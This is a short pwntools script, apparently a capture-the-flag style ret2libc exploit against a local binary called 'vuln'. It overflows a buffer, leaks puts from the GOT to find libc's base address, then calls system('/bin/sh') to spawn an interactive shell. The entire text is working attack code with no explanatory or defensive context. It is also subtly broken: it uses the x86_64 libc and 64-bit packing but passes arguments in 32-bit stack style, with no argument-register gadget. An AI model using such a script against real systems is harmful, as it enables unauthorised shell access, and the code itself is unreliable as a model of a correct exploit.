from pwn import *

p = process("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_plt = 0x400520
puts_got = 0x601018
main_addr = 0x400600

payload = b"A" * 72 + p64(puts_plt) + p64(main_addr) + p64(puts_got)
p.sendline(payload)
leaked_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_base = leaked_puts - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))

payload2 = b"A" * 72 + p64(system) + b"JUNK" + p64(binsh)
p.sendline(payload2)
p.interactive()